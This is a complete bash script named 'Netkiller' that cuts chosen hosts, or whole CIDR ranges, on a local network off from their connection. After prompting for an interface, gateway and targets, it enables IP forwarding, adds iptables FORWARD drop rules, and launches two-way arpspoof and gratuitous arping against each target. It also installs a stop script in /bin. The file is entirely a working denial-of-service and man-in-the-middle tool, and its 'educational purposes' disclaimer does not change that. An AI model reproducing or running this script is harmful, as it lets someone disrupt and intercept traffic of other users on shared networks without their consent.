#!/bin/bash

# Netkiller made by x!v3r
# For Educational Purposes only!
echo " "

# Prompt for network interface
echo "Enter the network interface (e.g., wlan0)"
read -p "> " INTERFACE
echo " "

# Prompt for gateway IP
echo "Enter the gateway IP (e.g., 10.0.0.1)"
read -p "> " GATEWAY
echo " "

# Prompt for target IPs (space-separated IPs or CIDR ranges)
echo "Enter Multiple Target (e.g., 10.0.0.10 10.0.0.20) or CIDR range (10.0.0.1/24)"
read -p "> " TARGET_INPUT
echo " "

# Get this device's IP address
DEVICE_IP="$(ip -4 addr show dev "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)"
if [ -z "$DEVICE_IP" ]; then
    echo "Error: Could not determine device IP for interface $INTERFACE"
    exit 1
fi

echo "[=== Network Attack Configurations ===]"
echo " "
echo "[*] Interface  => $INTERFACE"
echo "[*] Gateway IP => $GATEWAY"
echo "[*] Device IP  => $DEVICE_IP"
echo "[*] Targets IP => $TARGET_INPUT"

# Function to expand CIDR to individual IPs using ipcalc
expand_cidr() {
    local cidr=$1
    if ! command -v ipcalc &>/dev/null; then
        echo "Error: ipcalc is required but not installed"
        exit 1
    fi

    local network broadcast
    network=$(ipcalc -n "$cidr" | cut -d'=' -f2)
    broadcast=$(ipcalc -b "$cidr" | cut -d'=' -f2)
    local first_ip=$(ipcalc "$cidr" | grep "HostMin" | awk '{print $2}')
    local last_ip=$(ipcalc "$cidr" | grep "HostMax" | awk '{print $2}')

    # Convert IPs to decimal for iteration
    IFS=. read -r i1 i2 i3 i4 <<< "$first_ip"
    local start=$((i1 * 256**3 + i2 * 256**2 + i3 * 256 + i4))

    IFS=. read -r i1 i2 i3 i4 <<< "$last_ip"
    local end=$((i1 * 256**3 + i2 * 256**2 + i3 * 256 + i4))

    # Generate all IPs in range
    for ((ip=start; ip<=end; ip++)); do
        printf "%d.%d.%d.%d\n" $((ip >> 24 & 255)) $((ip >> 16 & 255)) $((ip >> 8 & 255)) $((ip & 255))
    done
}

# Initialize array for target IPs
TARGET_IPS=()

# Process input: split into individual IPs or CIDR ranges
IFS=' ' read -ra INPUT_ARRAY <<< "$TARGET_INPUT"
for item in "${INPUT_ARRAY[@]}"; do
    # Check if the item is a CIDR range (contains '/')
    if [[ $item == */* ]]; then
        # Expand CIDR to individual IPs
        while read -r ip; do
            # Exclude the device's own IP, network, and broadcast addresses
            if [ "$ip" != "$DEVICE_IP" ] && [ "$ip" != "$network" ] && [ "$ip" != "$broadcast" ]; then
                TARGET_IPS+=("$ip")
            fi
        done < <(expand_cidr "$item")
    else
        # Add single IP if it's not the device's IP
        if [ "$item" != "$DEVICE_IP" ]; then
            # Validate IP format
            if [[ $item =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                TARGET_IPS+=("$item")
            else
                echo "Warning: Invalid IP address format - $item"
            fi
        fi
    fi
done

# Check if we have valid target IPs
if [ ${#TARGET_IPS[@]} -eq 0 ]; then
    echo "No valid target IPs provided (device IP excluded)."
    exit 1
fi

# Create the stop script
cat > /bin/netkiller-stop << EOF
#!/bin/bash

# Restore default FORWARD policy
iptables -P FORWARD ACCEPT
# Flush iptables Forward rules
iptables -F FORWARD
# Kill all arpspoof and arping processes
pkill -f arpspoof
pkill -f arping
echo " "
echo "Netkiller Stopped. Restoring the connection..."
echo " "
EOF
chmod 755 /bin/netkiller-stop

# Display the expanded target list
echo " "
echo "[*] Netkiller Target IP's:"
printf '%s\n' "${TARGET_IPS[@]}" | sort -u
echo " "

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Run arpspoof for each target IP
for TARGET_IP in "${TARGET_IPS[@]}"; do
    echo "Netkiller blocking the IP => $TARGET_IP"
    # iptables rules
    iptables -P FORWARD DROP
    iptables -A FORWARD -s "$TARGET_IP" -j DROP
    iptables -A FORWARD -d "$TARGET_IP" -j DROP
    arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
    arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
    arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
done

echo " "
echo "To stop, Run: sudo netkiller-stop"
echo " "
